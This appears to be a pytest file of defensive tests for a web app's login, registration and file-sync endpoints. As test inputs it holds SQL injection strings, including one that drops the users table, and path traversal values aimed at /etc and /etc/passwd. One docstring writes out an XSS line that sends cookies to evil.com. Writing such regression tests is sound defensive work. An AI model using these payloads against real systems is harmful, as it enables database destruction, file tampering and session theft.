"""
test_security.py — Security-focused backend tests.

Section 9:
  9.2  SQL injection prevention
  9.3  Path traversal in /sync/{session_id}
  9.4  HttpOnly flag on session cookie

WHY: Auth endpoints are the security perimeter. These tests document
the expected hardened behaviour and catch regressions.

Note: Static analysis (bandit) is run separately via the CI pipeline.
Run manually with: bandit -r script.py -ll
"""

import os
import pytest


# ---------------------------------------------------------------------------
# 9.2  SQL Injection Prevention
# ---------------------------------------------------------------------------

class TestSQLInjection:
    """
    WHY: All SQL queries use parameterised ? placeholders.
         These tests confirm a SQL injection attempt is NOT executed.
    """

    def test_register_sql_injection_payload_stored_literally(self, client):
        """
        The payload " ' OR '1'='1 " should be stored as a literal username
        string, not interpreted as SQL. The route must not crash.
        """
        payload = {"username": "' OR '1'='1", "password": "x"}
        r = client.post("/api/register", json=payload)
        # Should succeed (store the weird string) — not 500
        assert r.status_code in (200, 400)  # 400 if duplicate, 200 if first time

    def test_login_sql_injection_does_not_authenticate(self, client):
        """
        WHY: ' OR '1'='1 in a username without parameterisation would bypass
             the WHERE clause. Parameterised queries must reject it with 400.
        """
        r = client.post("/api/login", json={"username": "' OR '1'='1", "password": "x"})
        assert r.status_code == 400
        assert "session_token" not in r.cookies

    def test_register_with_semicolon_injection(self, client):
        """Another classic injection: '; DROP TABLE users;--"""
        payload = {"username": "'; DROP TABLE users;--", "password": "x"}
        r = client.post("/api/register", json=payload)
        assert r.status_code in (200, 400)  # Must not be 500

    def test_login_after_injection_attempt_still_works(self, client):
        """
        WHY: After an injection attempt, the DB must still be intact and
        legitimate logins must still work.
        """
        client.post("/api/login", json={"username": "' OR '1'='1", "password": "x"})
        # Register a real user and verify they can still log in
        client.post("/api/register", json={"username": "realuser", "password": "realpass"})
        r = client.post("/api/login", json={"username": "realuser", "password": "realpass"})
        assert r.status_code == 200


# ---------------------------------------------------------------------------
# 9.3  Path Traversal in /sync/{session_id}
# ---------------------------------------------------------------------------

class TestPathTraversal:
    """
    WHY: If session_id is used directly in os.path.join without sanitisation,
         an attacker could supply ../../etc as session_id to write to /etc.
    """

    def test_path_traversal_attempt_does_not_write_outside_sandbox(self, client):
        evil_session_id = "../../etc"
        r = client.post(f"/sync/{evil_session_id}", content="malicious content")

        # The server must not create /etc/main.cpp (or any traversal target)
        traversal_target = "/etc/main.cpp"
        assert not os.path.exists(traversal_target), (
            "PATH TRAVERSAL SUCCEEDED — /sync wrote to /etc/main.cpp!"
        )
        # Server should not crash either
        assert r.status_code != 500

    def test_path_traversal_with_encoded_dots(self, client):
        """URL-encoded traversal attempt."""
        r = client.post("/sync/..%2F..%2Fetc", content="bad")
        assert r.status_code != 500
        assert not os.path.exists("/etc/main.cpp")

    def test_double_slash_session_id(self, client):
        """Double-slash in session_id shouldn't cause unintended paths."""
        r = client.post("/sync//etc/passwd", content="bad")
        assert r.status_code in (200, 404, 422)  # not 500


# ---------------------------------------------------------------------------
# 9.4  HttpOnly Flag on Session Cookie
# ---------------------------------------------------------------------------

class TestCookieFlags:
    """
    WHY: HttpOnly cookies cannot be read by JavaScript (document.cookie).
         If this flag is missing, XSS can steal session tokens trivially.
    """

    def test_session_cookie_has_httponly_flag(self, client):
        """
        WHY: Without HttpOnly, a XSS attack can do:
             fetch('https://evil.com/steal?c=' + document.cookie)
        """
        client.post("/api/register", json={"username": "cookietest", "password": "pass"})
        r = client.post("/api/login", json={"username": "cookietest", "password": "pass"})

        # Inspect the raw Set-Cookie header
        set_cookie = r.headers.get("set-cookie", "")
        assert "httponly" in set_cookie.lower(), (
            f"session_token cookie is missing HttpOnly flag. "
            f"Set-Cookie header was: {set_cookie!r}"
        )

    def test_session_cookie_name_is_session_token(self, client):
        """Confirm the cookie name so frontend can identify it if needed."""
        client.post("/api/register", json={"username": "namecheck2", "password": "pass"})
        r = client.post("/api/login", json={"username": "namecheck2", "password": "pass"})
        assert "session_token" in r.cookies

    def test_session_cookie_is_cleared_on_logout(self, client):
        """
        WHY: The cookie must be explicitly deleted server-side on logout.
             If only the DB row is deleted, old cookies still carry the header.
        """
        client.post("/api/register", json={"username": "cookieclr", "password": "pass"})
        client.post("/api/login", json={"username": "cookieclr", "password": "pass"})
        r = client.post("/api/logout")
        # After logout, the session_token cookie value should be empty or absent
        cookie_val = r.cookies.get("session_token", "NOT_SET")
        assert cookie_val in ("", "NOT_SET", None), (
            f"Cookie was not cleared on logout. Value: {cookie_val!r}"
        )
